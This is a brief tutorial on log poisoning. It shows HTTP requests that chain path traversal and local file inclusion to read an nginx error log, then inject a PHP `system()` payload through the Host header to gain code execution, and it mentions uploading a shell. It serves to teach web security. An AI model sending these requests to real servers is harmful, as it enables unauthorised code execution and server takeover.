Log poisoning is a vulnerability that is caused by local file inclusion where an attacker is able to view the contents of the log file and modify the value of HTTP headers - `Host:` and `User-Agent:` for example, to write arbitrary code and achieve remote code execution on the server.

For example, imagine an application that returns a `.php` page by reading the `page` parameter
```http
GET /blog.php?page=hello-world.php
Host: target-website.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0
```
We can exploit this by chaining path traversal and local file inclusion to view the log file:
```http
GET /blog.php?page=../../../../var/log/nginx/error.log
Host: target-website.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0
```
Notice that in the log file, the `Host` HTTP header is displayed along with other HTTP headers. Therefore, we will attempt to remote code execution to view the contents of a sensitive file or upload a shell to gain full control of the server.
```http
GET /blog.php?page=../../../../var/log/nginx/error.log
Host: <?php system('ls /etc/passwd') ?>
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0
```
```http
GET /blog.php?page=../../../../var/log/nginx/error.log
Host: <?php system('ls /etc/passwd') ?>
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0
```